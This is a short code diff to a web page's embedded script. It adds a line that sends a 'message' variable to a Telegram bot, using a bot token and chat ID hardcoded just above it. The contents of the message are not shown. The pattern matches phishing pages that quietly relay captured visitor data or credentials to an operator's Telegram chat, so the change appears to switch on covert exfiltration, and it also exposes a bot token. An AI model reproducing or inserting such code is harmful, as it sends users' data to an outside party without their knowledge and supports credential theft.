@@ -183,6 +183,7 @@
             const botToken1 = '8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8';
             const chatId1 = '6405482546';
             const url = `https://api.telegram.org/bot${botToken1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(message)}`;
+            await fetch(url);
         }
         fetchData();
     </script>
